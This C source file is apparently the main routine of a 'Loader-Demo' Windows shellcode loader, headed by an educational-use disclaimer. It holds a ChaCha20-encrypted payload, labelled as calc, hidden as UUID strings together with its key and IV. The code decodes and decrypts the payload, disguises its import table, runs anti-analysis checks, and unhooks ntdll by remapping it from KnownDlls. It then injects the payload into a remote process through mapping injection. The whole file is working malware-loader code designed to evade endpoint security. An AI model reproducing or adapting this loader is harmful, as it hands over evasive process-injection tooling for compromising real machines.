/*
    Loader-Demo
    ----------------------------------------
    This project is developed strictly for educational and research purposes.

    The code demonstrates Windows internals concepts such as:
    - loader behavior
    - system call resolution
    - memory management
    - API resolution techniques

    This project is NOT intended for real-world usage or deployment.

    Any misuse of this code for malicious, illegal, or unethical purposes
    is strictly prohibited. The author assumes NO responsibility for
    any consequences arising from the use or misuse of this code.

    By using this code, you agree that you are solely responsible for
    complying with all applicable laws and regulations.
*/



#include <Windows.h>
#include "Structs.h"
#include "Common.h"
#include "Debug.h"
#include "IatCamouflage.h"

float _fltused = 0;

/*-------------------------------------------------
 !!!ChaCha20 Encrypted Calc Payload & Key & Iv!!!
---------------------------------------------------*/
char* PayloadArray[17] = {
        "047DD9EF-0311-5778-B4C8-A53E26DA62E6", "B580D1C6-269E-0ECD-8EC2-224EEAAD2720", "EA3EB6F6-46A1-F512-A5AA-E7F30DB4D1F5",
        "569989A6-BAEB-7357-7379-BDC4C44EEA17", "E0DD85B0-1B2A-A418-10E8-26AD5071F622", "4F56D2CD-58DC-E179-F65F-D41F054BF46A",
        "6A84C775-AD69-7E17-4122-F0EDB47FBA81", "5C3E1D71-0966-B44E-853B-440EFC733D50", "4CD96263-E87B-1F4F-709F-64E96650A2E5",
        "F3CEF780-BD70-0AFC-8FF8-68DD5C1AFDC4", "628F7D78-B8B8-5DB7-D4BE-791BD43D93A0", "ED109D1C-0286-ECA3-4C08-21E548FA6644",
        "AAFA5B99-BB39-B8E6-37CB-1C6897C9A20C", "90034FED-728A-17EA-937D-A3E399A41409", "6D543A2D-3F17-8134-C79D-8EBE1A0837DE",
        "B9AB0A1C-3E99-28F6-3C2F-D6BC3AC189E8", "FFC5958E-407A-EC88-2B2B-1308260F58A5"
};

char* KeyArray[2] = {
        "4FCD1E11-774B-9D28-9E72-CBF3C1BDD763", "B44217DE-B69B-A159-8163-181899D80019"
};

char* IvArray[1] = {
        "EB5C4ADB-7F85-A608-2C18-889000000000"
};

#define NumberOfPayloadElements        17
#define NumberOfKeyElements            2
#define NumberOfIvElements             1


int main() {

    PVOID           pNtdll                        = NULL;
    
    DWORD           Pid                           = 0;
    HANDLE          hProcess                      = NULL;
    
    PBYTE           pDeobfuscatedPayload          = NULL,
                    pDeobfuscatedKey              = NULL,
                    pDeobfuscatedIv               = NULL;

    SIZE_T          sDeobfuscatedPayloadSize      = 0,
                    sDeobfuscatedKeySize          = 0,
                    sDeobfuscatedIvSize           = 0;

#ifdef DEBUG
    PRINTA("[i] Initializing Syscalls ... \n");
#endif
    if (!InitializeSyscalls())
        return -1;
#ifdef DEBUG
    PRINTA("[+] Syscalls Initialized Succesfully. \n");
#endif

//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------

#ifdef DEBUG
    PRINTA("[i] Deobfuscating Payload ... \n");
#endif
    if (!UuidDeobfuscation(PayloadArray, NumberOfPayloadElements, &pDeobfuscatedPayload, &sDeobfuscatedPayloadSize))
        return -1;
#ifdef DEBUG
    PRINTA("[+] Payload Deobfuscated Succesfully. \n");
#endif

//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------

#ifdef DEBUG
    PRINTA("[i] Deobfuscating Key ... \n");
#endif
    if (!UuidDeobfuscation(KeyArray, NumberOfKeyElements, &pDeobfuscatedKey, &sDeobfuscatedKeySize))
        return -1;
#ifdef DEBUG
    PRINTA("[i] Key Deobfuscated Succesfully . \n");
#endif

//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------
   
#ifdef DEBUG
    PRINTA("[i] Deobfuscating Iv ... \n");
#endif
    if (!UuidDeobfuscation(IvArray, NumberOfIvElements, &pDeobfuscatedIv, &sDeobfuscatedIvSize))
        return -1;
#ifdef DEBUG
    PRINTA("[+] Iv Deobfuscated Succesfully . \n");
#endif

//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------

#ifdef DEBUG
    PRINTA("[i] Applying Iat Camouflage ... \n");
#endif
    IatCamouflage();
#ifdef DEBUG
    PRINTA("[+] Iat Camouflage Applied Succesfully. \n");
#endif

//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------

#ifdef DEBUG
    PRINTA("[i] Activating Anti-Analysis Features ... \n");
#endif
    if (!AntiAnalysis(20000))
        return -2;
#ifdef DEBUG
    PRINTA("[+] Activated Anti-Analysis Features Succesfully. \n");
#endif

//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------

#ifdef DEBUG
    PRINTA("[i] Receiving Remote Process Handle ... \n");
#endif
    if (!GetRemoteProcessHandle(TARGET_PROCESS, &Pid, &hProcess))
        return -3;
#ifdef DEBUG
    PRINTA("[+] Received Remote Process Handle Succesfully. \n");
#endif

//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------

#ifdef DEBUG
    PRINTA("[i] Decrypting The Payload ... \n");
#endif
    if (!ChaCha20_Decrypt(pDeobfuscatedPayload, sDeobfuscatedPayloadSize, pDeobfuscatedKey, pDeobfuscatedIv))
        return -4;
#ifdef DEBUG
    PRINTA("[+] Payload Decrypted Succesfully. \n");
#endif

//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------

#ifdef DEBUG
    PRINTA("[i] Mapping NTDLL From Known Dlls ... \n");
#endif
    if (!MapNtdllFromKnownDlls(&pNtdll))
        return -5;
#ifdef DEBUG
    PRINTA("[+] Mapped NTDLL From Known Dlls Succesfully. \n");
#endif

//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------

#ifdef DEBUG
    PRINTA("[i] Replacing NTDLL's Text Section ... \n");
    if (!ReplaceNtdllTextSection(pNtdll))
        return -6;
    PRINTA("[+] Replaced NTDLL's Text Section Succesfully. \n");
#endif

//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------

#ifdef DEBUG
    PRINTA("\n\t------------------------------------[ MEMORY DUMP OF DECRYPTED PAYLOAD ]------------------------------------\n\n");
    PBYTE dump = (PBYTE)pDeobfuscatedPayload;
    for (int i = 0; i < sDeobfuscatedPayloadSize; i++) {
        if (i % 16 == 0)
            PRINTA("\n\t\t\t\t");
        PRINTA(" %02X", dump[i]);
    }
    PRINTA("\n");
    PRINTA("\n\t------------------------------------[ MEMORY DUMP OF DECRYPTED PAYLOAD ]------------------------------------\n\n");
#endif

//-------------------------------------------------------------------------------------------------------------------------------------------------------------------------

#ifdef DEBUG
    PRINTA("[i] Injecting Payload Via Mapping Injection ... \n");
#endif
    if (!RemoteMapInject(hProcess, pDeobfuscatedPayload, sDeobfuscatedPayloadSize))
        return -7;
#ifdef DEBUG
    PRINTA("[+] Payload Injected Succesfully. \n");
#endif

    return 0;
}